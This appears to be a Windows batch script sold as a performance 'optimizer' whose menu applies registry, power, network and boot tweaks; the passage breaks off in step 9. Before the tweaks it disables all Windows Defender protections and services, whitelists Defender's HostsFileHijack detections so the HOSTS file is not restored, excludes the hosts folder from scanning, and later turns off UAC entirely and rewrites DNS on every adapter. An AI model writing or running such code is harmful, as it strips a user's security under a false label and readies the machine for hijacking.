@echo off
setlocal enabledelayedexpansion
title Win Light Optimizer
color 0A

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Please run this script as Administrator!
    pause
    exit /b
)

:MAIN_MENU
cls
color 0A
echo.
echo  =====================================================
echo        Win Light Optimizer
echo  =====================================================
echo.
echo   [1]  System Optimizations  (27 steps)
echo   [2]  Clean Temp Files
echo   [3]  Windows Update  (Enable / Disable)
echo   [0]  Exit
echo.
echo  =====================================================
echo.
set "MENU_CHOICE="
set /p MENU_CHOICE="  Select option: "
echo.
if "%MENU_CHOICE%"=="1" goto :OPT1
if "%MENU_CHOICE%"=="2" goto :OPT2
if "%MENU_CHOICE%"=="3" goto :OPT3
if "%MENU_CHOICE%"=="0" goto :EXIT
echo  Invalid option, try again.
timeout /t 2 >nul
goto :MAIN_MENU

:: ====================================================
::  OPTION 1 - SYSTEM OPTIMIZATIONS
:: ====================================================
:OPT1
cls
echo.
echo.

:: Counters and failed step list
@echo off
set PASS=0
set FAIL=0
set "_FAILS=%TEMP%\opt_fails_%RANDOM%.txt"
if exist "!_FAILS!" del "!_FAILS!" >nul 2>&1

:: Disable ALL Defender protection for the duration of this script
echo Disabling Windows Defender...
:: PowerShell method - disables every feature
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true -EnableNetworkProtection Disabled -EnableControlledFolderAccess Disabled -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection Disabled -ErrorAction SilentlyContinue" >nul 2>&1
:: Registry method - backup in case Tamper Protection blocks PowerShell commands
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine" /v "EnableFileHashComputation" /t REG_DWORD /d 0 /f >nul 2>&1
:: Allow SettingsModifier:Win32/HostsFileHijack specifically so Defender never restores the HOSTS file
powershell -NoProfile -Command "Add-MpPreference -ThreatIDDefaultAction_Ids 2147728987,2147735501 -ThreatIDDefaultAction_Actions Allow,Allow -ErrorAction SilentlyContinue" >nul 2>&1
:: Stop the Defender services so they cannot intercept or revert HOSTS file writes
sc config WinDefend start= disabled >nul 2>&1
net stop WinDefend /y >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
net stop WdNisSvc /y >nul 2>&1
:: Add exclusion for the hosts folder so writes to it are never scanned
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '$env:SystemRoot\System32\drivers\etc' -ErrorAction SilentlyContinue" >nul 2>&1
echo  [OK] Defender disabled
echo.

:: ================================================
:: STEP 1 - Visual Performance
:: ================================================
echo [STEP 1/27] Adjusting Visual Performance...
set STEP_ERR=0
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "TaskbarAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "WindowAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ThumbnailCacheSize" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "FontSmoothing" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Desktop" /v "VisualFXSetting" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "MenuAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Visual Performance
    set /a PASS+=1
) else (
    echo  [FAIL] Visual Performance
    set /a FAIL+=1
    echo Visual Performance>> "!_FAILS!"
)

:: ================================================
:: STEP 2 - Timeout Tweaks
:: ================================================
echo [STEP 2/27] Applying Timeout Tweaks...
set STEP_ERR=0
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Timeout Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Timeout Tweaks
    set /a FAIL+=1
    echo Timeout Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 3 - Registry Tweaks
:: ================================================
echo [STEP 3/27] Applying Registry Tweaks...
set STEP_ERR=0
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoTileApplicationNotification" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Control Panel\Desktop" /v "SmoothScroll" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags\AllFolders\Shell" /v "FolderType" /t REG_SZ /d "NotSpecified" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "HideFastUserSwitching" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable UAC prompts entirely
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\WindowsInkWorkspace" /v "AllowWindowsInkWorkspace" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Registry Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Registry Tweaks
    set /a FAIL+=1
    echo Registry Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 4 - CPU Tweaks
:: ================================================
echo [STEP 4/27] Applying CPU Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d 42 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergySaverPolicy" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable CPU idle states to prevent latency spikes
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
powercfg -setactive SCHEME_CURRENT >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] CPU Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] CPU Tweaks
    set /a FAIL+=1
    echo CPU Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 5 - Display Tweaks
:: ================================================
echo [STEP 5/27] Applying Display Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\ModernSleep" /v "AdaptiveRefreshRate" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "VideoIdleTimeout" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "PowerSavingModeEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "PanelSelfRefresh" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "ForceOffScreenTimeout" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Display Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Display Tweaks
    set /a FAIL+=1
    echo Display Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 6 - GPU Tweaks
:: ================================================
echo [STEP 6/27] Applying GPU Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableFrameBufferCompression" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableGpuBoost" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1 || set STEP_ERR=1
:: Enable Hardware-Accelerated GPU Scheduling (HAGS) - reduces CPU-GPU latency
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] GPU Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] GPU Tweaks
    set /a FAIL+=1
    echo GPU Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 7 - Network Tweaks
:: ================================================
echo [STEP 7/27] Applying Network Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "PnPCapabilities" /t REG_DWORD /d 36 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "PnPCapabilities" /t REG_DWORD /d 36 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisablePowerManagement" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: TCP/IP tweaks
netsh int tcp set global dca=enabled >nul 2>&1 || set STEP_ERR=1
netsh int tcp set global netdma=enabled >nul 2>&1 || set STEP_ERR=1
netsh interface isatap set state disabled >nul 2>&1 || set STEP_ERR=1
netsh int tcp set global timestamps=disabled >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxConnectRetransmissions" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckFrequency" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckTicks" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MultihopSets" /t REG_DWORD /d "15" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\System\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "EnableAutoDoh" /t REG_DWORD /d "2" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "NonBlockingSendSpecialBuffering" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\Software\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d 0xFFFFFFFF /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: AFD tweaks
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "BufferAlignment" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultReceiveWindow" /t REG_DWORD /d 262144 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultSendWindow" /t REG_DWORD /d 262144 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DisableAddressSharing" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DisableChainedReceive" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DisableDirectAcceptEx" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DoNotHoldNICBuffers" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicSendBufferDisable" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "FastSendDatagramThreshold" /t REG_DWORD /d 1024 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "FastCopyReceiveThreshold" /t REG_DWORD /d 1024 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "IgnoreOrderlyRelease" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "IgnorePushBitOnReceives" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable Network Discovery (resource ID is language-neutral, works on any Windows language)
netsh advfirewall firewall set rule group="@FirewallAPI.dll,-32752" new enable=No >nul 2>&1
netsh advfirewall firewall set rule group="Network Discovery" new enable=No >nul 2>&1
REG ADD "HKLM\System\CurrentControlSet\Control\Network" /v "NewNetworkWindowOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable IPv6 on all adapters and system-wide
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" /v "DisabledComponents" /t REG_DWORD /d 0xFF /f >nul 2>&1 || set STEP_ERR=1
powershell -NoProfile -Command "Get-NetAdapter | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue }" >nul 2>&1
:: Set DNS: primary 1.1.1.1, secondary 8.8.8.8 on all active adapters
powershell -NoProfile -Command "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | ForEach-Object { Set-DnsClientServerAddress -InterfaceIndex $_.InterfaceIndex -ServerAddresses @('1.1.1.1','8.8.8.8') }" >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Network Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Network Tweaks
    set /a FAIL+=1
    echo Network Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 8 - System and USB Tweaks
:: ================================================
echo [STEP 8/27] Applying System Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergySaverStatus" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DynamicThrottlePolicy" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EcoMode" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USB\Parameters" /v "DisableSelectiveSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\HidUsb\Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "DisableLegacyUSBSupport" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\usbaudio\Parameters" /v "PowerSettings" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\HidUsb\Parameters" /v "DeviceIdleEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBHUB3\Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\HidUsb\Parameters" /v "DisableWakeFromSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USB\Parameters" /v "ForceHCResetOnResume" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USB" /v "DisableSelectiveSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "DisableSelectiveSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] System and USB Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] System and USB Tweaks
    set /a FAIL+=1
    echo System and USB Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 9 - Boot and CPU Scheduler Tweaks
:: ================================================
echo [STEP 9/27] Applying Boot and CPU Scheduler Tweaks...
set STEP_ERR=0
bcdedit /set bootux disabled >nul 2>&1 || set STEP_ERR=1
bcdedit /set tscsyncpolicy enhanced >nul 2>&1 || set STEP_ERR=1
bcdedit /set uselegacyapicmode No >nul 2>&1 || set STEP_ERR=1
bcdedit /set x2apicpolicy Enable >nul 2>&1 || set STEP_ERR=1
bcdedit /deletevalue useplatformclock >nul 2>&1
bcdedit /deletevalue useplatformtick >nul 2>&1
bcdedit /set disabledynamictick yes >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Boot and CPU Scheduler Tweaks
    set /a PASS+=1
) else (
